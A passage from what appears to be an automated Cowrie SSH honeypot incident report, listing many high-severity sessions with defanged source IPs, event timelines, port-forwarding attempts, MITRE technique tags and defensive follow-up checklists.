| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:32:08` | `cowrie.session.connect` |
| `2026-08-24 05:32:10` | `cowrie.client.version` |
| `2026-08-24 05:32:10` | `cowrie.client.kex` |
| `2026-08-24 05:32:16` | `cowrie.login.success` |
| `2026-08-24 05:32:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.255.213[.]72` to AbuseIPDB if not already reported
- [ ] Block `37.255.213[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdfaeb957c6c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:38 |
| **Last Seen** | 2026-08-24 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:38:15` | `cowrie.session.connect` |
| `2026-08-24 05:38:15` | `cowrie.client.version` |
| `2026-08-24 05:38:16` | `cowrie.client.kex` |
| `2026-08-24 05:38:16` | `cowrie.login.success` |
| `2026-08-24 05:38:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:38:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:38:17` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83e71f79624

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:38 |
| **Last Seen** | 2026-08-24 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:38:19` | `cowrie.session.connect` |
| `2026-08-24 05:38:19` | `cowrie.client.version` |
| `2026-08-24 05:38:20` | `cowrie.client.kex` |
| `2026-08-24 05:38:20` | `cowrie.login.success` |
| `2026-08-24 05:38:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:38:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:38:21` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2ba92c1874

| Field | Detail |
|---|---|
| **Source IP** | `58.104.77[.]75` |
| **First Seen** | 2026-08-24 05:47 |
| **Last Seen** | 2026-08-24 05:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:47:20` | `cowrie.session.connect` |
| `2026-08-24 05:47:21` | `cowrie.client.version` |
| `2026-08-24 05:47:21` | `cowrie.client.kex` |
| `2026-08-24 05:47:24` | `cowrie.login.success` |
| `2026-08-24 05:47:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.104.77[.]75` to AbuseIPDB if not already reported
- [ ] Block `58.104.77[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fdcc185752

| Field | Detail |
|---|---|
| **Source IP** | `34.53.180[.]80` |
| **First Seen** | 2026-08-24 05:47 |
| **Last Seen** | 2026-08-24 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:47:31` | `cowrie.session.connect` |
| `2026-08-24 05:47:31` | `cowrie.client.version` |
| `2026-08-24 05:47:31` | `cowrie.client.kex` |
| `2026-08-24 05:47:33` | `cowrie.login.success` |
| `2026-08-24 05:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.180[.]80` to AbuseIPDB if not already reported
- [ ] Block `34.53.180[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa256f0a77ef

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-08-24 05:47 |
| **Last Seen** | 2026-08-24 05:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:47:32` | `cowrie.session.connect` |
| `2026-08-24 05:47:33` | `cowrie.client.version` |
| `2026-08-24 05:47:33` | `cowrie.client.kex` |
| `2026-08-24 05:47:36` | `cowrie.login.success` |
| `2026-08-24 05:47:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1783f73c32b3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:47 |
| **Last Seen** | 2026-08-24 05:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:47:48` | `cowrie.session.connect` |
| `2026-08-24 05:47:48` | `cowrie.client.version` |
| `2026-08-24 05:47:48` | `cowrie.client.kex` |
| `2026-08-24 05:47:49` | `cowrie.login.success` |
| `2026-08-24 05:47:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:47:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:47:49` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407694f58ef0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:47 |
| **Last Seen** | 2026-08-24 05:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:47:52` | `cowrie.session.connect` |
| `2026-08-24 05:47:52` | `cowrie.client.version` |
| `2026-08-24 05:47:52` | `cowrie.client.kex` |
| `2026-08-24 05:47:53` | `cowrie.login.success` |
| `2026-08-24 05:47:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:47:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:47:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29abfe03b87c

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-08-24 05:50 |
| **Last Seen** | 2026-08-24 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:50:26` | `cowrie.session.connect` |
| `2026-08-24 05:50:27` | `cowrie.client.version` |
| `2026-08-24 05:50:27` | `cowrie.client.kex` |
| `2026-08-24 05:50:29` | `cowrie.login.success` |
| `2026-08-24 05:50:29` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451d09361975

| Field | Detail |
|---|---|
| **Source IP** | `115.68.133[.]201` |
| **First Seen** | 2026-08-24 05:50 |
| **Last Seen** | 2026-08-24 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:50:35` | `cowrie.session.connect` |
| `2026-08-24 05:50:35` | `cowrie.client.version` |
| `2026-08-24 05:50:35` | `cowrie.client.kex` |
| `2026-08-24 05:50:37` | `cowrie.login.success` |
| `2026-08-24 05:50:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.133[.]201` to AbuseIPDB if not already reported
- [ ] Block `115.68.133[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1033b94ce556

| Field | Detail |
|---|---|
| **Source IP** | `94.228.240[.]2` |
| **First Seen** | 2026-08-24 05:55 |
| **Last Seen** | 2026-08-24 05:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:55:24` | `cowrie.session.connect` |
| `2026-08-24 05:55:25` | `cowrie.client.version` |
| `2026-08-24 05:55:25` | `cowrie.client.kex` |
| `2026-08-24 05:55:26` | `cowrie.login.success` |
| `2026-08-24 05:55:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.228.240[.]2` to AbuseIPDB if not already reported
- [ ] Block `94.228.240[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-328352dd1b57

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-08-24 05:55 |
| **Last Seen** | 2026-08-24 05:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:55:32` | `cowrie.session.connect` |
| `2026-08-24 05:55:32` | `cowrie.client.version` |
| `2026-08-24 05:55:32` | `cowrie.client.kex` |
| `2026-08-24 05:55:34` | `cowrie.login.success` |
| `2026-08-24 05:55:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c49e696a172

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:57 |
| **Last Seen** | 2026-08-24 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:57:16` | `cowrie.session.connect` |
| `2026-08-24 05:57:16` | `cowrie.client.version` |
| `2026-08-24 05:57:16` | `cowrie.client.kex` |
| `2026-08-24 05:57:17` | `cowrie.login.success` |
| `2026-08-24 05:57:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:57:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:57:17` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b0c449b8f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:57 |
| **Last Seen** | 2026-08-24 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:57:20` | `cowrie.session.connect` |
| `2026-08-24 05:57:20` | `cowrie.client.version` |
| `2026-08-24 05:57:20` | `cowrie.client.kex` |
| `2026-08-24 05:57:21` | `cowrie.login.success` |
| `2026-08-24 05:57:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:57:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:57:21` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c647344a7df

| Field | Detail |
|---|---|
| **Source IP** | `203.188.242[.]10` |
| **First Seen** | 2026-08-24 05:59 |
| **Last Seen** | 2026-08-24 05:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:59:43` | `cowrie.session.connect` |
| `2026-08-24 05:59:44` | `cowrie.client.version` |
| `2026-08-24 05:59:44` | `cowrie.client.kex` |
| `2026-08-24 05:59:46` | `cowrie.login.success` |
| `2026-08-24 05:59:46` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.188.242[.]10` to AbuseIPDB if not already reported
- [ ] Block `203.188.242[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d05da215969

| Field | Detail |
|---|---|
| **Source IP** | `81.215.2[.]43` |
| **First Seen** | 2026-08-24 05:59 |
| **Last Seen** | 2026-08-24 05:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:59:52` | `cowrie.session.connect` |
| `2026-08-24 05:59:52` | `cowrie.client.version` |
| `2026-08-24 05:59:52` | `cowrie.client.kex` |
| `2026-08-24 05:59:54` | `cowrie.login.success` |
| `2026-08-24 05:59:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f31d8b61c1

| Field | Detail |
|---|---|
| **Source IP** | `62.148.236[.]52` |
| **First Seen** | 2026-08-24 06:00 |
| **Last Seen** | 2026-08-24 06:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:00:00` | `cowrie.session.connect` |
| `2026-08-24 06:00:01` | `cowrie.client.version` |
| `2026-08-24 06:00:01` | `cowrie.client.kex` |
| `2026-08-24 06:00:02` | `cowrie.login.success` |
| `2026-08-24 06:00:02` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.148.236[.]52` to AbuseIPDB if not already reported
- [ ] Block `62.148.236[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9970b26fed2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.133[.]195` |
| **First Seen** | 2026-08-24 06:00 |
| **Last Seen** | 2026-08-24 06:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:00:07` | `cowrie.session.connect` |
| `2026-08-24 06:00:07` | `cowrie.client.version` |
| `2026-08-24 06:00:07` | `cowrie.client.kex` |
| `2026-08-24 06:00:09` | `cowrie.login.success` |
| `2026-08-24 06:00:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.133[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.133[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a58ed321d5

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-24 06:04 |
| **Last Seen** | 2026-08-24 06:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:04:31` | `cowrie.session.connect` |
| `2026-08-24 06:04:31` | `cowrie.client.version` |
| `2026-08-24 06:04:31` | `cowrie.client.kex` |
| `2026-08-24 06:04:32` | `cowrie.login.success` |
| `2026-08-24 06:04:32` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a842f969a22

| Field | Detail |
|---|---|
| **Source IP** | `45.187.33[.]152` |
| **First Seen** | 2026-08-24 06:04 |
| **Last Seen** | 2026-08-24 06:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:04:37` | `cowrie.session.connect` |
| `2026-08-24 06:04:38` | `cowrie.client.version` |
| `2026-08-24 06:04:38` | `cowrie.client.kex` |
| `2026-08-24 06:04:40` | `cowrie.login.success` |
| `2026-08-24 06:04:41` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.187.33[.]152` to AbuseIPDB if not already reported
- [ ] Block `45.187.33[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ad8a0773db

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:06 |
| **Last Seen** | 2026-08-24 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:06:47` | `cowrie.session.connect` |
| `2026-08-24 06:06:47` | `cowrie.client.version` |
| `2026-08-24 06:06:48` | `cowrie.client.kex` |
| `2026-08-24 06:06:49` | `cowrie.login.success` |
| `2026-08-24 06:06:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:06:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:06:50` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82f67c81ad21

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:06 |
| **Last Seen** | 2026-08-24 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:06:51` | `cowrie.session.connect` |
| `2026-08-24 06:06:51` | `cowrie.client.version` |
| `2026-08-24 06:06:51` | `cowrie.client.kex` |
| `2026-08-24 06:06:52` | `cowrie.login.success` |
| `2026-08-24 06:06:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 06:06:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 06:06:52` | `cowrie.direct-tcpip.data` |
| `2026-08-24 06:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baeaf31bc084

| Field | Detail |
|---|---|
| **Source IP** | `34.77.108[.]93` |
| **First Seen** | 2026-08-24 06:12 |
| **Last Seen** | 2026-08-24 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:12:45` | `cowrie.session.connect` |
| `2026-08-24 06:12:45` | `cowrie.login.success` |
| `2026-08-24 06:12:46` | `cowrie.session.params` |
| `2026-08-24 06:12:46` | `cowrie.command.input` |
| `2026-08-24 06:12:46` | `cowrie.command.input` |
| `2026-08-24 06:12:46` | `cowrie.command.failed` |
| `2026-08-24 06:12:46` | `cowrie.command.input` |
| `2026-08-24 06:12:46` | `cowrie.log.closed` |
| `2026-08-24 06:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.108[.]93` to AbuseIPDB if not already reported
- [ ] Block `34.77.108[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356c81ac80e7

| Field | Detail |
|---|---|
| **Source IP** | `34.77.108[.]93` |
| **First Seen** | 2026-08-24 06:12 |
| **Last Seen** | 2026-08-24 06:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:12:59` | `cowrie.session.connect` |
| `2026-08-24 06:12:59` | `cowrie.login.success` |
| `2026-08-24 06:12:59` | `cowrie.session.params` |
| `2026-08-24 06:12:59` | `cowrie.command.input` |
| `2026-08-24 06:12:59` | `cowrie.command.failed` |
| `2026-08-24 06:13:02` | `cowrie.log.closed` |
| `2026-08-24 06:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.108[.]93` to AbuseIPDB if not already reported
- [ ] Block `34.77.108[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac5fb6d78fa

| Field | Detail |
|---|---|
| **Source IP** | `34.77.108[.]93` |
| **First Seen** | 2026-08-24 06:13 |
| **Last Seen** | 2026-08-24 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 06:13:01` | `cowrie.session.connect` |
| `2026-08-24 06:13:01` | `cowrie.login.success` |
| `2026-08-24 06:13:01` | `cowrie.session.params` |
| `2026-08-24 06:13:01` | `cowrie.command.input` |
| `2026-08-24 06:13:02` | `cowrie.log.closed` |
| `2026-08-24 06:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.108[.]93` to AbuseIPDB if not already reported
- [ ] Block `34.77.108[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e8acad103a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 06:16 |
